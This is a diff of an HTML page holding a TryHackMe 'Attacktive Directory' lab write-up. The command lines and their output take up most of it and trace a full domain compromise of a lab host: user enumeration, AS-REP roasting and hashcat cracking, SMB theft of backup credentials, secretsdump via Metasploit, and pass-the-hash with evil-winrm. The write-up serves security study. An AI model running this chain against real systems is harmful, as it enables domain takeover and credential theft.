@@ -4465,15 +4465,20 @@
                 
                 
                 <h1 id="attacktivedirectory">attacktivedirectory</h1>
+<p>Notes from challenges I did @ <a href="https://tryhackme.com">https://tryhackme.com</a>.</p>
+<p>These are notes from <a href="https://tryhackme.com/room/attacktivedirectory">attacktivedirectory</a>.</p>
 <h2 id="prepare">Prepare</h2>
+<p>Install Impacket, kerbrute, Bloodhound and Neo4j</p>
 <div class="highlight"><pre><span></span><code>sudo git clone &lt;https://github.com/SecureAuthCorp/impacket.git&gt; /opt/impacket
 sudo pip3 install -r /opt/impacket/requirements.txt
 <span class="nb">cd</span> /opt/impacket/ <span class="o">&amp;&amp;</span> sudo python3 ./setup.py install
 sudo apt install bloodhound neo4j
+go get github.com/ropnop/kerbrute
 sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade
 </code></pre></div>
 <h2 id="scan">Scan</h2>
-<p>nmap -sC -sV 10.10.12.33</p>
+<p>Scan target with <code>nmap -sC -sV 10.10.12.33</code></p>
+<details class="output"><summary>Nmap output</summary></details>
 <div class="highlight"><pre><span></span><code>Nmap scan report for 10.10.12.33
 Host is up (0.021s latency).
 Not shown: 987 closed ports
@@ -4520,44 +4525,43 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.37 seconds
 </code></pre></div>
-<p>enum4linux -U -o 10.10.12.33</p>
+<p>Enumerate port 139/445 with <code>enum4linux -U -o 10.10.12.33</code></p>
+<details class="output"><summary>enum4linux output</summary></details>
 <div class="highlight"><pre><span></span><code>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 19 15:24:22 2021
 
- ==========================
+==========================
 |    Target Information    |
- ==========================
+==========================
 Target ........... 10.10.12.33
 RID Range ........ 500-550,1000-1050
 Username ......... &#39;&#39;
 Password ......... &#39;&#39;
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-
- ===================================================
+===================================================
 |    Enumerating Workgroup/Domain on 10.10.12.33    |
- ===================================================
+===================================================
 [E] Can&#39;t find workgroup/domain
 
-
- ====================================
+====================================
 |    Session Check on 10.10.12.33    |
- ====================================
+====================================
 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
 [+] Server 10.10.12.33 allows sessions using username &#39;&#39;, password &#39;&#39;
 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
 [+] Got domain/workgroup name:
 
- ==========================================
+==========================================
 |    Getting domain SID for 10.10.12.33    |
- ==========================================
+==========================================
 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
 Domain Name: THM-AD
 Domain Sid: S-1-5-21-3591857110-2884097990-301047963
 [+] Host is part of a domain (not a workgroup)
 
- =====================================
+=====================================
 |    OS information on 10.10.12.33    |
- =====================================
+=====================================
 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
 Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
 [+] Got OS info for 10.10.12.33 from smbclient:
@@ -4565,9 +4569,9 @@ Use of uninitialized value $global_workgroup in concatenation (.) or string at .
 [+] Got OS info for 10.10.12.33 from srvinfo:
 Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
 
- ============================
+============================
 |    Users on 10.10.12.33    |
- ============================
+============================
 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
 [E] Couldn&#39;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED
 
@@ -4576,6 +4580,7 @@ Use of uninitialized value $global_workgroup in concatenation (.) or string at .
 enum4linux complete on Thu Aug 19 15:24:34 2021
 </code></pre></div>
 <p>./kerbrute -domain spookysec.local -dc-ip 10.10.12.33  -users ~/userlist.txt</p>
+<details class="output"><summary>kerbrute output</summary></details>
 <div class="highlight"><pre><span></span><code>Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
 
 [*] Valid user =&gt; james
@@ -4606,6 +4611,7 @@ enum4linux complete on Thu Aug 19 15:24:34 2021
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca777efe84cbdeaa48d35b9$cf364f98148fce49cc67dd350754a9c9ccf20dd516b1c2c6aecb6984aba91fca5b386b4ba7b59434f54440ecccdd549533157318a55752abe941976eae78132f61832fba98bc391ee52c51e924cd8d091b6e6d854bc16e769184867024f195936687839c4e63cf54f7a2e1749020c279e3b08f78826ca90deffcda9bdd721a87166fa6e9fe6f68cd493751df05b2ae92a0e5e466f8c674bf16c346e9ee9714f7098369d90dad8e5bac5b4ac316e94ff65acd8914a356450be18b671db831031c6a709369d586d704bc827f2221f3edfd60e5f675fb6ac97570e20bd094362e354b63279e757486c82162d6ae04467d7c1261
 </code></pre></div>
 <p>hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt</p>
+<details class="output"><summary>hashcat output</summary></details>
 <div class="highlight"><pre><span></span><code>hashcat (v6.1.1) starting...
 
 OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -4648,8 +4654,6 @@ Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: Kerberos 5, etype 23, AS-REP
 Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca...7c1261
-Time.Started.....: Thu Aug 19 15:45:16 2021 (0 secs)
-Time.Estimated...: Thu Aug 19 15:45:16 2021 (0 secs)
 Guess.Base.......: File (/home/fab1/passwordlist.txt)
 Guess.Queue......: 1/1 (100.00%)
 Speed.#1.........:   158.0 kH/s (10.67ms) @ Accel:64 Loops:1 Thr:64 Vec:16
@@ -4660,10 +4664,11 @@ Restore.Point....: 0/70188 (0.00%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidates.#1....: m123456 -&gt; cowgirlup
 
-Started: Thu Aug 19 15:44:40 2021
-Stopped: Thu Aug 19 15:45:18 2021
+Started: 15:44:40
+Stopped: 15:45:18
 </code></pre></div>
 <p>smbclient -L \\10.10.12.33 -U svc-admin@spookysec.local</p>
+<details class="output"><summary>smbclient user output</summary></details>
 <div class="highlight"><pre><span></span><code>Enter svc-admin@spookysec.local&#39;s password:
 
         Sharename       Type      Comment
@@ -4677,6 +4682,7 @@ Stopped: Thu Aug 19 15:45:18 2021
 SMB1 disabled -- no workgroup available
 </code></pre></div>
 <p>smbclient \\10.10.12.33\backup -U svc-admin@spookysec.local</p>
+<details class="output"><summary>smbclient backup output</summary></details>
 <div class="highlight"><pre><span></span><code>Enter svc-admin@spookysec.local&#39;s password:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; dir
@@ -4688,6 +4694,7 @@ smb: \&gt; dir
 smb: \&gt; more backup_credentials.txt
 </code></pre></div>
 <p>dcode YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</p>
+<details class="output"><summary>dcode backup_credentials.txt</summary></details>
 <div class="highlight"><pre><span></span><code>    __                         __
   |/  |                   | / /
   |   | ___  ___  ___  ___|  (
@@ -4696,13 +4703,12 @@ smb: \&gt; more backup_credentials.txt
                                     /
 [+] Decoded from Base64 : backup@spookysec.local:backup2517860
 </code></pre></div>
-<p>echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d</p>
-<div class="highlight"><pre><span></span><code>backup@spookysec.local:backup2517860
-</code></pre></div>
+<p>Now that we know this is Base64 we can run this command to read the content: <code>echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d</code></p>
 <p>Running secretsdump.py didn't work for me e.g.:</p>
 <p>secretsdump.py spookysec.local/backup:backup2517860@10.10.12.33 -use-vss</p>
 <p>So i used metasplot und set lhost, SMBDomain, RHOSTS,  SMBPass and SMBUser:</p>
-<div class="highlight"><pre><span></span><code>       =[ metasploit v6.1.0-dev                           ]
+<details class="output"><summary>metasplot with secretsdump.py</summary></details>
+<div class="highlight"><pre><span></span><code>      =[ metasploit v6.1.0-dev                           ]
 + -- --=[ 2157 exploits - 1146 auxiliary - 367 post       ]
 + -- --=[ 596 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 8 evasion                                       ]
@@ -4715,11 +4721,11 @@ msf6 &gt; search secretsdump
 Matching Modules
 ================
 
-   #  Name                                                       Disclosure Date  Rank    Check  Description
-   -  ----                                                       ---------------  ----    -----  -----------
-   0  auxiliary/scanner/smb/impacket/secretsdump                                  normal  No     DCOM Exec
-   1  post/windows/gather/credentials/windows_sam_hivenightmare  2021-07-20       normal  No     Windows SAM secrets leak - HiveNightmare
-   2  auxiliary/gather/windows_secrets_dump                                       normal  No     Windows Secrets Dump
+  #  Name                                                       Disclosure Date  Rank    Check  Description
+  -  ----                                                       ---------------  ----    -----  -----------
+  0  auxiliary/scanner/smb/impacket/secretsdump                                  normal  No     DCOM Exec
+  1  post/windows/gather/credentials/windows_sam_hivenightmare  2021-07-20       normal  No     Windows SAM secrets leak - HiveNightmare
+  2  auxiliary/gather/windows_secrets_dump                                       normal  No     Windows Secrets Dump
 
 
 Interact with a module by name or index. For example info 2, use 2 or use auxiliary/gather/windows_secrets_dump
@@ -4816,7 +4822,8 @@ msf6 auxiliary(scanner/smb/impacket/secretsdump) &gt; exploit
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 </code></pre></div>
-<p>evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</p>
+<p>Secretsdump.py usese the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: <code>evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</code></p>
+<details class="output"><summary>evil-winrm output and flags</summary></details>
 <div class="highlight"><pre><span></span><code>Evil-WinRM shell v3.2
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
